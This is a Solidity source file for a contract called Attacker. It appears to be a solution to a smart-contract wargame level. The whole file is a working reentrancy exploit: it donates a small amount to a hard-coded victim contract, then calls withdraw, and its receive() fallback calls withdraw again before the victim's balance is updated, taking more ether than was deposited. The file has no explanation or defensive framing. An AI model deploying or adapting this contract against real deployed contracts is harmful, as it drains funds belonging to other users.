// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    // Your victim's contract instance.
    address victim = 0x53611358575B4309B84Bb0f654e6648483e7Cfd0;
    uint amount = 1000000000000000;
    bool success;
    uint public cont = 0;

    function donate() external payable {
        (success, ) = payable(victim).call{value: amount}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(success, "donation failed");
    }

    function attack() external payable{
        (success, ) = victim.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );

        require(success, "withdraw failed");
    }

    receive() external payable {
        if(cont < 2)
        {
            cont++;
            (success, ) = victim.call(
            abi.encodeWithSignature("withdraw(uint256)", amount));
        }
        
    }
}